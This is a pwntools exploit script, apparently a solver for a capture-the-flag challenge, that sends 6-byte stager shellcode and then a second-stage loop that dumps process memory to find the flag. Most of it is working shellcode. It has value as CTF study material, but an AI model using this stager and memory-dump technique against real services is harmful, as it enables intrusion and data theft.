import os
import re

from pwn import asm, context, remote

context.arch = "amd64"
context.bits = 64
context.log_level = "info"

HOST = os.environ.get("SERVICE_SHELLSIX_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_SHELLSIX_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/exploit.py (author-provided).
#
# The service reads exactly 6 bytes of raw shellcode into an executable
# buffer and jumps to it -- the entire "exploit" is picking 6 bytes that
# do something useful. `shr rdx, 24; syscall` reuses whatever syscall
# the service itself just made (its return value/args are still live in
# registers from the read() that loaded our shellcode) to pivot: after
# shifting rdx (the read() length argument, which is a small controlled
# value) right by 24 bits, the next raw `syscall` executes read() again
# but now with a huge, attacker-chosen buffer size, letting us smuggle
# in a far larger second-stage payload right behind our first 6 bytes.
#
# That second stage repeatedly calls write(1, page_addr, 0xff) over
# increasing page-aligned addresses (rbp<<12), starting from page 1: rax
# stays fixed at 1 (write()) all along, rdi is the stdout fd, and rbp
# increments every iteration. Unmapped pages harmlessly return an error
# from write() and the loop moves on; any mapped page gets its first
# 0xff bytes dumped straight back to us over the socket -- a brute-force
# memory exfiltration primitive, not a shell. We scan the resulting
# stream for the flag rather than assuming any specific file/shell flow.
p = remote(HOST, PORT)

payload = asm(
    """
    shr rdx, 24
    syscall
    """
)
p.sendafter(b"shellcode: ", payload)

egg_hunter = asm(
    """
    xor rbx, rbx
    inc ebx
    push rbx
    pop rdi
    push rbx
    pop rbp
    xor rdx, rdx
    dec dl
findloop:
    push rbp
    pop rsi
    shl rsi, 12
    push rbx
    pop rax
    syscall
    inc rbp
    jmp findloop
    """
)

p.send(b"\x00" * 6 + egg_hunter)

dump = p.recvall(timeout=30)
p.close()

match = re.search(rb"SCC\{[^}]*\}", dump)
if match:
    print(match.group(0).decode(errors="replace"))
else:
    print(f"Flag not found in {len(dump)} bytes of dumped memory")
    raise SystemExit(1)
